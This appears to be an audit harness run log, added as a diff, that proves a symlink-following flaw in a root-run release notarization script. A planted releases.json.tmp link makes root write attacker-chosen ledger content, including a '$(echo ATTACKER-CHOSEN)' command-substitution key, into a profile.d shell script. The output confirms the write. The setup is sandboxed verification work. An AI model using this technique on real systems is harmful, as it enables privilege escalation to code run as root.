@@ -1,0 +1,51 @@
+## command: bash sbx.sh v3-healthsym 60 -- python3 -I /scratch/harness-02.py
+## harness:
+# v3-healthsym check 02: notarize-release.py (run as root by deploy.sh:113) follows a planted releases.json.tmp
+# and carries attacker-planted ledger content. Single uid; paths redirected to a temp tree; the drive-side
+# `mutis-admin notarize` subprocess is stubbed to a committed result (stands in for a live SealLog call).
+import importlib.util, os, stat, tempfile, json, subprocess, types
+from pathlib import Path
+spec = importlib.util.spec_from_file_location("notarize", "/target/deploy/scripts/notarize-release.py")
+nr = importlib.util.module_from_spec(spec); spec.loader.exec_module(nr)
+root = Path(tempfile.mkdtemp(prefix="srv-"))
+cfg = root / "mutis.toml"; cfg.write_text('[features]\nseallog = true\n[ootle]\nseallog_component = "component_x"\n')
+cur = root / "current"; (cur / "dist" / ".well-known").mkdir(parents=True)
+(cur / "RELEASE").write_text("r-new\n"); (cur / "dist" / ".well-known" / "mutis-manifest.json").write_text("{}")
+status = root / "status"; status.mkdir(); os.chmod(status, 0o2775)
+etc = root / "etc-profile.d"; etc.mkdir()
+nr.CONFIG, nr.CURRENT, nr.LEDGER = cfg, cur, status / "releases.json"
+nr.subprocess = types.SimpleNamespace(run=lambda *a, **k: types.SimpleNamespace(
+    returncode=0, stdout=json.dumps({"committed": True, "tx_id": "tx-dummy"}) + "\n", stderr=""))
+# What drive does (dir is group-writable and not sticky): replace the ledger with its own, plant the tmp link.
+payload = [{"release": "old", "manifest_sha256": "0", "$(echo ATTACKER-CHOSEN)": 1}]
+(status / "releases.json").write_text(json.dumps(payload))
+target = etc / "zz-mutis.sh"            # does not exist yet
+os.symlink(target, status / "releases.json.tmp")
+print("target exists before:", target.exists())
+rc = nr.main()
+print("main rc:", rc)
+print("target exists after:", target.exists(), "mode", oct(stat.S_IMODE(os.stat(target).st_mode)))
+print("target content:\n" + target.read_text())
+print("releases.json is symlink:", os.path.islink(status / "releases.json"), "->", os.readlink(status / "releases.json"))
+## output:
+target exists before: False
+notarize: r-new manifest 44136fa355b3… in tx tx-dummy
+main rc: 0
+target exists after: True mode 0o644
+target content:
+[
+ {
+  "release": "old",
+  "manifest_sha256": "0",
+  "$(echo ATTACKER-CHOSEN)": 1
+ },
+ {
+  "release": "r-new",
+  "manifest_sha256": "44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a",
+  "tx_id": "tx-dummy",
+  "at": "2026-10-20T07:57:41Z"
+ }
+]
+
+releases.json is symlink: True -> /work/tmp/srv-v6f990_r/etc-profile.d/zz-mutis.sh
+## exit: 0
